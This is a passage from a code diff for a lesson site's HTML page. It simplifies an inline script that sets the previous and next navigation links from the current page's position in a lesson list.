     let path = window.location.pathname;
     let currentPage = path.substring(path.lastIndexOf('/') + 1) || "index.html";
-
-    // 3. Find current page index
     let currentIndex = lessons.indexOf(currentPage);
-
-    // 4. Update buttons if page is in the list
     const prevBtn = document.querySelector('.nav-btn.prev');
     const nextBtn = document.querySelector('.nav-btn.next');
-
     if (currentIndex !== -1) {
-        // Handle Previous Button
-        if (currentIndex > 0 && prevBtn) {
-            prevBtn.setAttribute('href', lessons[currentIndex - 1]);
-        }
-        
-        // Handle Next Button
-        if (currentIndex < lessons.length - 1 && nextBtn) {
-            nextBtn.setAttribute('href', lessons[currentIndex + 1]);
-        }
+        if (currentIndex > 0 && prevBtn) prevBtn.setAttribute('href', lessons[currentIndex - 1]);
+        if (currentIndex < lessons.length - 1 && nextBtn) nextBtn.setAttribute('href', lessons[currentIndex + 1]);
     }
 </script>
-
 </body>
 </html>
